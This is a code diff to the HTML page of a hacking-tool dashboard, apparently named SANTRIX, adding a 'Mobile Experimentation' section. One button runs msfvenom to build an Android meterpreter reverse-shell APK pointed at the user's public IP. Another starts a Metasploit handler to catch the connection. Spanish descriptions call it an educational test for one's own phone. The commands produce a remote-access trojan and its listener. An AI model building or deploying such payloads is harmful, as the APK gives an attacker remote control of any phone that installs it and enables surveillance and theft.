@@ -229,6 +229,18 @@
         </div>
 
         <div class="tool-category">
+            <span class="category-title">Mobile Experimentation</span>
+            <div class="tool-card" onclick="runCommand('msfvenom -p android/meterpreter/reverse_tcp LHOST=$(curl -s ifconfig.me) LPORT=4444 -o scripts/lab_test.apk')">
+                <span class="tool-name">Gen Mobile Lab APK</span>
+                <span class="tool-desc">Genera un APK de prueba para tu propio teléfono (Uso educativo).</span>
+            </div>
+            <div class="tool-card" onclick="runCommand('msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit\"')">
+                <span class="tool-name">Start Mobile Listener</span>
+                <span class="tool-desc">Prepara SANTRIX para recibir la conexión de tu teléfono.</span>
+            </div>
+        </div>
+
+        <div class="tool-category">
             <span class="category-title">System Tools</span>
             <div class="tool-card" onclick="runCommand('msfconsole')">
                 <span class="tool-name">Metasploit Console</span>
